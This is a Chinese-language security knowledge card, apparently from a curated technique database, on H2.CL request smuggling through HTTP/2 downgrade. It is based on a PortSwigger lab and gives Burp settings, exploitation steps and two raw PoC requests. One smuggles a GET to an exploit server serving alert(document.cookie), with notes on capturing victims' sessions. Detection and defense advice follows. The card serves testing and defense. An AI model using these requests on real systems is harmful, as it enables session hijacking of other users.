---
id: web-generic-http-smuggling-h2-cl-downgrade-injected-content-length
title: H2.CL 请求走私：前端降级 HTTP/2 时复用客户端注入的 Content-Length，后端按 CL=0 把剩余字节当下一请求
type: scenario
domain: web
path: web/generic/http-smuggling
technique: http2-downgrade-h2-cl-smuggling
aliases:
- H2.CL
- HTTP/2 request smuggling
- HTTP/2 降级走私
- content-length 注入 H2
- h2 CL smuggling
tags:
- http2
- request-smuggling
- h2-cl
- downgrade
- content-length
- desync
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-12'
updated: '2026-11-12'
verification:
  verified_by: verifier-V609
  verified_at: '2026-11-12T19:38:42+08:00'
  notes: 已对照原文12691「H2.CL vulnerabilities」节与截图06-15逐项核对：载入靶场、POST / + Content-Length:0 + body SMUGGLED 首包200、第二请求404、Burp关闭Update Content-Length并勾选Allow HTTP/2 ALPN override、body夹带完整GET /resources(CL:6,x=1)后302到Host对应/resources、exploit server托管alert(document.cookie)、受害者每10秒访问主页并在exploit日志出现请求、Solved，卡内参数/步骤/PoC与原文一致。已把利用步骤第3条修正为“后端把Body字节直接当作下一个GET请求处理，其302响应残留在响应队列由后续请求取走”，原表述“下一个请求被解析成GET”易误解。dedup：除自身外最高相关为CL.0、未知TE-CL差异、空CL+TE、Varnish管线等HTTP/1链，结论与PoC均不同链；与本篇H2.TE卡按注入头(CL vs TE)和后端解析路径区分，原子。原文为PortSwigger靶场未给产品受影响版本，affected_versions保持省略；未在本机复现。
---

## 一句话结论

前端以 HTTP/2 接收请求、再降级成 HTTP/1.1 转发给后端时，如果在生成 HTTP/1 请求时复用了客户端在 HTTP/2 头部里自行注入的 `Content-Length`（而不是按 HTTP/2 帧长度计算并校验），就可以在 H2 请求体里夹带第二个请求：前端按 H2 隐式长度认为消息到此结束，后端按注入的 `Content-Length: 0` 认为请求体为空，剩余字节被当成下一个请求处理，形成 H2.CL 请求走私。

## 原理

- HTTP/2 的消息长度是隐式的：由 HEADERS/DATA 帧的长度累加决定，帧头里自带显式长度字段，正常不会产生边界歧义。
- 但当 H2 前端为 HTTP/1.1 后端做协议降级时，它需要为转发请求补一个 `Content-Length`。规范要求 H2 请求中若带 `content-length`，其值必须与按帧计算的长度一致；若前端没有校验这一点，而是直接复用客户端给的 `content-length` 值，就会把错误的长度传给后端。
- 攻击者在 H2 头部写入 `content-length: 0`，并把 `SMUGGLED` 或一个完整 HTTP/1 请求放进 H2 请求体。前端基于 H2 帧长度读取整段消息并转发；后端看到 `Content-Length: 0`，认为 POST 没有 body，后面的字节就成为下一个请求的开头。
- 这就是"边界不一致"：前端以为只有一个请求，后端看到两个。后续请求会被拼接到走私前缀上，第二个正常请求得到 404 或被吞掉，从而可以进一步做响应队列中毒、捕获他人会话或让受害者浏览器加载恶意资源。
- 为什么成立：协议降级是有损转换，H2 的隐式长度语义在 H1 中必须由 `Content-Length` 重建；前端若信任客户端输入且不校验，就把确保边界一致的责任交给了攻击者。

## 触发条件

- 前端接受 HTTP/2，并将请求降级为 HTTP/1.1 转发给后端（常见于 CDN/反代 + 旧后端）。
- 前端在降级时复用客户端 H2 头部中的 `Content-Length`，未与 H2 隐式长度校验，也未拒绝不一致的请求。
- 前端与后端之间的连接会被复用于多个请求（否则只能自伤，无法影响他人）。
- 攻击者能用支持原始 HTTP/2 的工具（如 Burp Repeater 设为 HTTP/2、关闭 Update Content-Length）直接构造伪头部与正文。
- 后端按 HTTP/1 的 `Content-Length` 语义解析请求体。

## 利用步骤

1. 在 Burp Repeater 中把协议切换为 HTTP/2，关闭 `Update Content-Length`，勾选 `Allow HTTP/2 ALPN override`，确保请求按原始 H2 发出。
2. 先发探测请求：`POST / HTTP/2`，头部 `Content-Length: 0`，Body 为 `SMUGGLED`。紧跟一个正常请求；若第二个请求返回 404/异常，说明后端把 `SMUGGLED` 当作下一个请求的前缀，H2.CL 成立。
3. 构造能影响他人的完整请求：在 H2 Body 中写入 `GET /resources HTTP/1.1`、`Host: <受害站点或恶意服务器>`、`Content-Length: 6` 和 `x=1`。前端按注入的 `Content-Length: 0` 结束外层 POST 后，后端把 Body 里的这段字节直接当作下一个请求处理（即完整的 GET），它产生的 302 响应会残留在前后端连接的响应队列里，被之后经同一连接转发来的请求（如受害者主页请求）取走。
4. 原文靶场中受害者浏览器每 10 秒访问主页，走私该 GET 使其请求攻击者 exploit server 上的 `/resources`，返回 `alert(document.cookie)` 的 JavaScript 并执行。
5. 更强的利用是走私一个完整请求毒化响应队列，捕获后续受害者的响应（如管理员登录后的 302 + `Set-Cookie`），再用该会话访问后台。

## PoC

```http
POST / HTTP/2
Host: TARGET
Content-Length: 0

SMUGGLED
```

```http
POST / HTTP/2
Host: TARGET
Cookie: session=<attacker-session>
Content-Length: 0

GET /resources HTTP/1.1
Host: EXPLOIT-SERVER
Content-Length: 6

x=1
```

说明：请求按原文 PortSwigger H2.CL 靶场流程结构化复现，域名与随机 ID 已泛化；Burp 需关闭 Update Content-Length 才能保留注入的 CL。未在本机执行，仅用于授权测试。

## 变体与关联

- 变体：注入非 0 的 `Content-Length` 可精确控制后端读多少字节作为 body，用于把后续请求截断或拼接。
- 变体：若前端会覆盖 CL 但保留其他头，可结合 H2.TE 或 CRLF 注入绕过。
- 关联：[[web-generic-http-smuggling-h2-te-downgrade-chunked]]（H2 下的 TE 变体）、[[web-generic-http-smuggling-h2-response-queue-poisoning-session-capture]]（H2.CL/TE 的典型危害）、[[web-generic-http-smuggling-cl0-backend-ignores-content-length]]（HTTP/1 的 CL.0 对应场景）。
- 边界：前端校验 H2 `content-length` 与帧长度一致、降级时重建并规范化 CL、或前后端不跨用户复用连接时，本链不成立。

## 检测与防御

- 检测：HTTP/2 请求中出现与帧长度不一致的 `content-length`；前后端日志中同一请求出现两个响应或请求数不匹配；正常的第二个请求返回 404/被拼接前缀；响应队列出现他人页面。
- 防御：前端严格校验 H2 `content-length` 等于按帧计算的长度，不一致直接拒绝（RST_STREAM/400）；降级时丢弃客户端 CL 并重建；不要跨客户端复用前后端连接或按用户隔离连接池。
- 加固：统一端到端 HTTP/2 或使用可信的 H2→H1 转换实现；WAF/网关升级到能解析 HTTP/2 语义的版本；监控异常 404 与响应错配。
